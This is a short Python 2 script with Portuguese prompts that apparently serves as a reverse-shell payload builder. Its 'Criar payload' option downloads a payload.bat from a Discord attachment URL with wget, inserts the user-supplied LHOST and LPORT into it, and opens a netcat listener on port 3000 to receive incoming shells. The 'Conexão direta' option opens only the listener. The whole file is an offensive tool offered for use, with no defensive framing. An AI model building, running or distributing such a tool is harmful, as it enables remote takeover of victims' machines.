#!/usr/bin/python
# -*- coding: utf8 -*-

import os
from time import sleep

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
def arquivo(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print ('erro').format(**locals())
            
    
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)
os.system("clear")
print color ("  Hora         Data","green")
os.system(' date +"  %R      %D" ')
print color("""
    [a] Criar payload
    [b] Conexão direta
""","yellow")
sleep(1.0)
op = raw_input(color("a/b: ","green"))
if op.lower() == "a":
    print("")
    lhost = raw_input(color("LHOST: ","blue"))
    print("")
    lport = raw_input(color("LPORT: ","blue"))
    os.system('wget https://cdn.discordapp.com/attachments/581170733565214731/820071820505251870/payload.bat > /dev/null 2>&1')
    sleep(5.0)
    arquivo("payload.bat","LHOST",lhost)
    arquivo("payload.bat","LPORT",lport)
    print("")
    print color("[ ✔ ] Payload Criado","yellow")
    sleep(1.0)
    print("")
    print color("Iniciando Conexão TCP porta 3000 ...","blue")
    sleep(1.0)
    print("")
    print color("Esperando Conexão ...","blue")
    sleep(1.0)
    print color("Caso sua conexão for perdida Reinicie o script e escolha conexão direta.","yellow")
    sleep(1.0)
    os.system("nc -nvlp 3000")
elif op.lower() == "b":
    print("")
    print color("Iniciando Conexão TCP porta 3000 ...","blue")
    sleep(3.0)
    print("")
    print color("Esperando Conexão ...","blue")
    sleep(1.0)
    os.system("nc -nvlp 3000")
else:
	print color("ERRO !!","red")



 
